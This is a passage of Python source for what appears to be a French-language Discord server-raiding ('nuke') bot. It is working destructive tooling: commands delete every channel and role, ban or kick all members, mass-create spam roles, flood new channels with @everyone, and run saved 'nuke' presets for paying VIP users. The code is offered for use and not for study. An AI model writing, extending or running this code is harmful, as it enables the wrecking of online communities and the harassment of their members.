                ))
            except Exception:  # noqa: BLE001
                pass

    @bot.command(name='spam-r')
    @require_auth()
    async def spam_r(ctx: commands.Context, role_name: str, count: int = 5):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        me = ctx.guild.me
        if me is None or not me.guild_permissions.manage_roles:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Roles.', EMBED_COLOR_BAD))
            return
        if count < 1 or count > 250:
            await ctx.send(embed=_embed('Erreur', 'count doit etre entre 1 et 250.', EMBED_COLOR_BAD))
            return
        base = role_name.strip()[:90] or 'role'
        start = asyncio.get_event_loop().time()
        created = await _spam_roles(ctx.guild, base, count, reason=f'+spam-r by {ctx.author}')
        elapsed = asyncio.get_event_loop().time() - start
        await ctx.send(embed=_embed(
            'spam-r', f'**{created}/{count}** roles `{base}-N` crees en {elapsed:.1f}s.', EMBED_COLOR_OK,
        ))

    @bot.command(name='nuke')
    @require_auth()
    async def nuke(ctx: commands.Context, channels: int = 50, *, message: str = '@everyone'):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        me = ctx.guild.me
        if me is None or not me.guild_permissions.administrator:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
            return
        if channels < 1 or channels > 500:
            await ctx.send(embed=_embed('Erreur', 'channels doit etre entre 1 et 500.', EMBED_COLOR_BAD))
            return
        await _execute_nuke(
            ctx.guild, ctx.author,
            channels=channels, message=message, repeat=5,
            channel_name='nuked', server_name=None, delete_roles=True,
            spam_role_name='nuked', spam_role_count=50,
        )

    @bot.command(name='reset')
    @require_auth()
    async def reset_cmd(ctx: commands.Context):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.administrator:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
            return
        start = asyncio.get_event_loop().time()
        chan_tasks = [_safe(c.delete(reason='+reset')) for c in list(guild.channels)]
        role_targets = [
            r for r in guild.roles
            if not r.is_default() and not r.managed and r < me.top_role
        ]
        role_tasks = [_safe(r.delete(reason='+reset')) for r in role_targets]
        await asyncio.gather(*chan_tasks, *role_tasks)
        terminal = await _safe(guild.create_text_channel(name='_terminal', reason='+reset terminal'))
        elapsed = asyncio.get_event_loop().time() - start
        remaining = {r.id for r in guild.roles}
        deleted = sum(1 for r in role_targets if r.id not in remaining)
        if terminal:
            try:
                await terminal.send(embed=_embed(
                    'reset', f'Termine en {elapsed:.1f}s - {deleted}/{len(role_targets)} roles supprimes.',
                    EMBED_COLOR_OK,
                ))
            except Exception:  # noqa: BLE001
                pass

    @bot.command(name='ban-all')
    @require_auth()
    async def ban_all(ctx: commands.Context):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.ban_members:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Ban Members.', EMBED_COLOR_BAD))
            return
        targets = [
            m for m in guild.members
            if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id and m.top_role < me.top_role
        ]
        start = asyncio.get_event_loop().time()
        await asyncio.gather(*[_safe(m.ban(reason=f'+ban-all by {ctx.author}', delete_message_days=0)) for m in targets])
        elapsed = asyncio.get_event_loop().time() - start
        remaining = {m.id for m in guild.members}
        banned = sum(1 for m in targets if m.id not in remaining)
        await ctx.send(embed=_embed(
            'ban-all', f'**{banned}/{len(targets)}** membres bannis en {elapsed:.1f}s.', EMBED_COLOR_OK,
        ))

    @bot.command(name='kick-all')
    @require_auth()
    async def kick_all(ctx: commands.Context):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.kick_members:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Kick Members.', EMBED_COLOR_BAD))
            return
        targets = [
            m for m in guild.members
            if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id and m.top_role < me.top_role
        ]
        start = asyncio.get_event_loop().time()
        await asyncio.gather(*[_safe(m.kick(reason=f'+kick-all by {ctx.author}')) for m in targets])
        elapsed = asyncio.get_event_loop().time() - start
        remaining = {m.id for m in guild.members}
        kicked = sum(1 for m in targets if m.id not in remaining)
        await ctx.send(embed=_embed(
            'kick-all', f'**{kicked}/{len(targets)}** membres expulses en {elapsed:.1f}s.', EMBED_COLOR_OK,
        ))

    @bot.command(name='rename-s')
    @require_auth()
    async def rename_s(ctx: commands.Context, *, name: str):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.manage_guild:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Server.', EMBED_COLOR_BAD))
            return
        new_name = name.strip()
        if len(new_name) < 2 or len(new_name) > 100:
            await ctx.send(embed=_embed('Erreur', 'Le nom doit faire entre 2 et 100 caracteres.', EMBED_COLOR_BAD))
            return
        old_name = guild.name
        try:
            await guild.edit(name=new_name, reason=f'+rename-s by {ctx.author}')
        except discord.HTTPException as e:
            await ctx.send(embed=_embed('Erreur', f'`{e}`', EMBED_COLOR_BAD))
            return
        await ctx.send(embed=_embed(
            'rename-s', f'Serveur renomme: **{old_name}** -> **{new_name}**', EMBED_COLOR_OK,
        ))

    @bot.command(name='supp-roles')
    @require_auth()
    async def supp_roles(ctx: commands.Context, target: str = 'all'):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Roles.', EMBED_COLOR_BAD))
            return
        target = target.strip().lower()
        if target != 'all':
            try:
                rid = int(target)
            except ValueError:
                await ctx.send(embed=_embed('Erreur', 'target doit etre \"all\" ou un ID numerique.', EMBED_COLOR_BAD))
                return
            role = guild.get_role(rid)
            if role is None:
                await ctx.send(embed=_embed('Erreur', f'Aucun role avec l ID `{rid}`.', EMBED_COLOR_BAD))
                return
            if role.is_default() or role.managed or role >= me.top_role:
                await ctx.send(embed=_embed('Erreur', 'Role non supprimable.', EMBED_COLOR_BAD))
                return
            await role.delete(reason=f'+supp-roles by {ctx.author}')
            await ctx.send(embed=_embed('supp-roles', f'Role **{role.name}** supprime.', EMBED_COLOR_OK))
            return
        deletable = [
            r for r in guild.roles
            if not r.is_default() and not r.managed and r < me.top_role
        ]
        if not deletable:
            await ctx.send(embed=_embed('supp-roles', 'Aucun role supprimable trouve.', EMBED_COLOR_BAD))
            return
        start = asyncio.get_event_loop().time()
        await asyncio.gather(*[_safe(r.delete(reason='+supp-roles all')) for r in deletable])
        remaining = {r.id for r in guild.roles}
        deleted = sum(1 for r in deletable if r.id not in remaining)
        elapsed = asyncio.get_event_loop().time() - start
        await ctx.send(embed=_embed(
            'supp-roles', f'**{deleted}/{len(deletable)}** roles supprimes en {elapsed:.1f}s.', EMBED_COLOR_OK,
        ))

    @bot.command(name='n-config')
    @require_vip()
    async def n_config(ctx: commands.Context):
        presets = _get_user_presets(ctx.author.id)
        embed = _embed(
            'Configuration de tes presets nuke',
            f'Tu as actuellement **{len(presets)}** preset(s) sauvegarde(s).

'
            f'Utilise les boutons ci-dessous pour creer, lister ou supprimer.
'
            f'Execute ensuite avec `{CHILD_PREFIX}p-run <preset_name>`.',
            EMBED_COLOR,
        )
        await ctx.send(embed=embed, view=NConfigView(ctx.author.id))

    @bot.command(name='p-run')
    @require_vip()
    async def p_run(ctx: commands.Context, preset_name: str):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.administrator:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
            return
        preset = _get_user_presets(ctx.author.id).get(preset_name)
        if preset is None:
            await ctx.send(embed=_embed('Erreur', f'Preset `{preset_name}` introuvable.', EMBED_COLOR_BAD))
            return
        await _execute_nuke(
            guild, ctx.author,
            channels=int(preset.get('channels', 50)),
            message=preset.get('message', '@everyone'),
            repeat=int(preset.get('repeat', 5)),
            channel_name=preset.get('channel_name', 'nuked'),
            server_name=preset.get('server_name'),
            delete_roles=bool(preset.get('delete_roles', True)),
            spam_role_name=preset.get('spam_role_name', 'nuked'),
            spam_role_count=int(preset.get('spam_role_count', 50)),
        )
        await ctx.send(embed=_embed('p-run', f'Preset `{preset_name}` execute.', EMBED_COLOR_OK))


# --------------------------------------------------------------------------- #
# Entrypoint
# --------------------------------------------------------------------------- #

if __name__ == '__main__':
    main_bot.run(MAIN_TOKEN, reconnect=True)
